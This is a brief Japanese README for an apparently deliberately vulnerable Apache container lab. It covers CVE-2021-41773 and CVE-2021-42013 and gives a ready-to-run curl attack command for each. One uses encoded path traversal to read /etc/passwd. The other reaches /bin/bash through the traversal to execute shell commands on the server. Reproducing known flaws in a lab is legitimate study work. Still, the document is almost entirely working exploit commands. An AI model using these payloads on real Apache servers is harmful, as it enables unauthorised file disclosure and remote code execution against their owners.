# 脆弱性を持ったApacheコンテナ


## CVE-2021-41773
任意のファイルの中身が確認できる脆弱性。  

攻撃コマンド
```
curl http://IPアドレス:8081/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

## CVE-2021-42013
任意のコードが実行できる脆弱性。

攻撃コマンド
```
curl 'http://IPアドレス:8082/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; ls -la'
```
